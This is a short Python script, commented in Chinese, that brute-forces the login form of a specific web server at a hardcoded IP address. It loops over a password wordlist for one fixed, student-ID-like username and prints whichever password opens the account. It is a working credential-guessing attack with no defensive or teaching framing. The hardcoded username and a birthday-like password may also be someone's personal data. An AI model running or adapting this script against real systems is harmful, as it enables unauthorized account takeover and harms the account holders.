'''
#模拟登陆
import requests
from bs4 import BeautifulSoup

url = 'http://113.55.11.245/netdru/?q=user'

params = {"edit[name]:": 20161120030, "edit[pass]:": 19970416,"op:":'登陆'}
html=requests.post(url,data=params)
print(html.text)
'''

import requests
from bs4 import BeautifulSoup
import sys

passFile=open('F:/pwd1.txt')

url = 'http://113.55.11.245/netdru/?q=user'

for line in passFile.readlines():
    password = line.strip('\n')
    params = {"edit[name]:": 20161120030, "edit[pass]:": password,"op:":'登陆'}
    html=requests.post(url,data=params)
    #print(html.text)
    soup = BeautifulSoup(html.text,'lxml')
    #print(soup.prettify())
    p = soup.find_all(class_='block block-netdru_student')
    #print(p)
    if p == []:
        #print("failed")
        continue
    else:
        print("succeed")
        print("密码：",password)
        sys.exit(0)
